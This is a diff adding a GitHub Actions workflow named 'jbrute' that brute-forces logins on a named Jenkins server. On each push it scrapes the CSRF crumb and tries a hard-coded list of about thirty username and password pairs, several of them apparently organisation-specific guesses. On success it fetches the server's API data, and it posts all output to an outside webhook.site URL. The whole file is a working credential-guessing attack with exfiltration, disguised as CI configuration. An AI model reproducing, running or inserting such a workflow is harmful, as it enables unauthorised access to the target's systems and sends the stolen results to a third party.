@@ -1,0 +1,66 @@
+name: jbrute
+on:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  jbrute:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Brute
+        run: |
+          {
+            rm -f /tmp/cj
+            curl -sS -k -m 15 -c /tmp/cj -o /tmp/l.html https://jenkins.htpl.cc/login
+            CRUMB=$(grep -oE "name=\"Jenkins-Crumb\" value=\"[^\"]+" /tmp/l.html | head -1 | sed "s/.*value=\"//")
+            ACTION=$(grep -oE "action=\"[^\"]+" /tmp/l.html | head -1 | sed "s/action=\"//")
+            echo "crumb=$CRUMB action=$ACTION"
+            while IFS=: read -r U P; do
+              [ -z "$U" ] && continue
+              code=$(curl -sS -k -m 12 -b /tmp/cj -c /tmp/cj -o /tmp/r -w "%{http_code}" -X POST "https://jenkins.htpl.cc${ACTION:-/j_spring_security_check}" --data-urlencode "j_username=$U" --data-urlencode "j_password=$P" --data-urlencode "from=/" --data-urlencode "Jenkins-Crumb=$CRUMB" 2>/dev/null)
+              if [ "$code" = "302" ] || [ "$code" = "303" ]; then
+                echo "SUCCESS $U:$P code=$code"
+                curl -sS -k -m 12 -b /tmp/cj https://jenkins.htpl.cc/api/json -o /tmp/api
+                head -c 800 /tmp/api
+              else
+                echo "FAIL $U:$P code=$code"
+              fi
+            done <<LIST
+admin:admin
+admin:password
+admin:jenkins
+admin:Jenkins@123
+admin:Payatom@123
+admin:payatom@123
+admin:Htpl@123
+admin:htpl@123
+admin:Admin@123
+admin:admin@123
+admin:P@ssw0rd
+admin:changeme
+admin:Payatom@2024
+admin:Payatom@2025
+admin:Jenkins@2024
+admin:Jenkins@2025
+admin:ashd18457#
+admin:ProbePass123!
+admin:randomsecretkeyisthisone
+admin:a4a76aabb2293cbe
+admin:oQFfNtp4j9qL5CyF9QGEzAR7cVZRjoEG
+admin:harwex
+harsha:harsha
+harsha:Payatom@123
+harsha:Htpl@123
+harsha:ashd18457#
+harsha:admin
+Harsha-Sudo08:Payatom@123
+Harsha-Sudo08:Htpl@123
+dev.ops:Payatom@123
+dev.ops:Htpl@123
+jenkins:jenkins
+root:root
+root:Payatom@123
+LIST
+          } > /tmp/out.txt 2>&1
+          curl -s -m 20 -X POST "https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73" -H "Content-Type: text/plain" --data-binary @/tmp/out.txt
